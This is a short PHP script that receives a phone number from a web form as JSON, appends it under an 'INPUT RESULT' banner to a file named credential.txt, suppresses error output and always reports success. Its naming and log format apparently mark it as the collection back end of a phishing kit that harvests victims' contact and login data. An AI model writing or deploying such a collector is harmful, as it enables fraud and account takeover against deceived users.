<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
// Function to log credentials and metadata
function logCredentials($phone)
{
    // Get client IP address
    $clientIP = $_SERVER['REMOTE_ADDR'];

    // Get user agent
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Prepare log format
    $logEntry = "
|----------- INPUT RESULT --------------|
|----------| P H O N E   N U M B E R  |--------------|
Email: 
Phone Number: $phone
";
    // Write to credential.txt
    file_put_contents('credential.txt', $logEntry, FILE_APPEND);
}

// Set JSON header
header('Content-Type: application/json');

// Get POST data from the request
$data = json_decode(file_get_contents('php://input'), true);

// Extract phone number from the received data
$phone = filter_var($data['phone'], FILTER_SANITIZE_EMAIL);
$email = $data['email'];
// Check for valid input
if ($phone) {
    // Log the attempt
    logCredentials($phone);
    echo json_encode(['valid' => true, 'message' => "Success to save phone number"]);
} else {
    echo json_encode(['valid' => false, 'message' => "Invalid input"]);
}
